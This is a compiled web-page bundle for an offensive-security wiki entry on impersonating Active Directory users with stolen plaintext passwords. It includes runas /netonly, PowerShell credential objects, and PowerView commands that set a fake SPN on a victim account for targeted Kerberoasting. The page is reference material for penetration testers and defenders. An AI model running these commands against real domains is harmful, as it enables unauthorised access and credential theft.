import{_ as o,c as k,a5 as l,G as a,w as t,B as r,o as p,j as s,a as i}from"./chunks/framework.B5CpDqM0.js";const C=JSON.parse('{"title":"Impersonation","description":"","frontmatter":{"authors":"ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/movement/credentials/impersonation.md","filePath":"ad/movement/credentials/impersonation.md","lastUpdated":1724982529000}'),d={name:"ad/movement/credentials/impersonation.md"};function c(g,e,u,F,E,m){const n=r("PluginTabsTab"),h=r("PluginTabs");return p(),k("div",null,[e[3]||(e[3]=l('<h1 id="impersonation" tabindex="-1">Impersonation <a class="header-anchor" href="#impersonation" aria-label="Permalink to &quot;Impersonation&quot;">â€‹</a></h1><p>When credentials are found (through <a href="./dumping/index">dumping</a> or <a href="./cracking">cracking</a> for instance), attackers try to use them to obtain access to new resources. Depending on the harvested credential material type, the impersonation can be done in different ways.</p><ul><li>LM or NT password hash: <a href="./../ntlm/pth">pass-the-hash</a></li><li>RC4 Kerberos key (i.e. NT hash): <a href="./../kerberos/ptk">overpass-the-hash</a></li><li>non-RC4 Kerberos key (i.e. DES or AES): <a href="./../kerberos/ptk">pass-the-key</a> (alias for overpass-the-hash)</li><li>Kerberos ticket: <a href="./../kerberos/ptt">pass-the-ticket</a></li><li>plaintext password: the techniques listed below</li></ul>',3)),a(h,null,{default:t(()=>[a(n,{label:"RunAs"},{default:t(()=>e[0]||(e[0]=[s("p",null,[i("RunAs is a standard Windows command that allows to execute a program under a different user account. When stuffing an Active Directory account's password, the "),s("code",null,"/netonly"),i(" flag must be set to indicate the credentials are to be used for remote access only.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"runas"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /netonly"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /user:"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\$"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"USER"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "powershell.exe"')])])])],-1),s("p",null,"Since the password cannot be supplied as an argument, the session must be interactive.",-1)])),_:1}),a(n,{label:"Powershell"},{default:t(()=>e[1]||(e[1]=[s("p",null,[i("In Powershell, it is possible to impersonate a user by create a credential object and supplying it with the "),s("code",null,"-Credential"),i(" argument in the next command.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Credential object creation (prompted)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$credential = Get-Credential")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Credential object creation (not prompted)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$password = ConvertTo-SecureString "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'pasword_of_user_to_run_as'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," -AsPlainText -Force")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$credential = New-Object System.Management.Automation.PSCredential("),s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"'FQDN.DOMAIN\\user_to_run_as'"),s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},","),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $password)")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Usage")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Start-Process"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," Notepad.exe"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Credential"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $credential")])])])],-1)])),_:1}),a(n,{label:"PowerView"},{default:t(()=>e[2]||(e[2]=[s("p",null,[i("Most of "),s("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",target:"_blank",rel:"noreferrer"},"PowerView"),i("'s functions have the "),s("code",null,"-Credential"),i(", "),s("code",null,"-Domain"),i(" and "),s("code",null,"-Server"),i(' parameters that can be used to explicitly specify the user to run as, the target Domain and and the target Domain Controller. Just like the previous "Powershell" tab, the -Credential option has to be supplied with a credential object.')],-1),s("p",null,[i("Here is an example for "),s("a",{href:"./../dacl/targeted-kerberoasting"},"targeted Kerberoasting"),i(".")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Credential object creation (not prompted)")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$password = ConvertTo-SecureString "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'pasword_of_user_to_run_as'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," -AsPlainText -Force")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$credential = New-Object System.Management.Automation.PSCredential("),s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"'FQDN.DOMAIN\\user_to_run_as'"),s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},","),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $password)")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Usage")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Set-DomainObject"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Credential"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $Cred "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-Domain"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'FQDN.DOMAIN'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Server"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'Domain_Controller'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Identity"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'victimuser'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," @{serviceprincipalname='nonexistant/BLAHBLAH'}")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$User = Get-DomainUser -Credential $Cred -Domain "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'FQDN.DOMAIN'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," -Server "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'Domain_Controller'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'victimuser'")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$User "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"|"),s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," Get-DomainSPNTicket"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Credential"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $Cred "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-Domain"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'FQDN.DOMAIN'"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Server"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'Domain_Controller'"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," fl")])])])],-1)])),_:1})]),_:1}),e[4]||(e[4]=l(`<p><a href="https://github.com/bugch3ck/SharpLdapWhoami" target="_blank" rel="noreferrer">SharpLdapWhoami</a> can then be used to make sure the user is correctly impersonated. A standard whoami command will only return the local user rights, not the users impersonated during remote operations (like LDAP queries to the DC).</p><div class="language-powershell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.\\</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">SharpLdapWhoami.exe</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.\\</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">SharpLdapWhoami.exe</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> /</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">method:kerberos </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">all</span></span></code></pre></div>`,2))])}const b=o(d,[["render",c]]);export{C as __pageData,b as default};
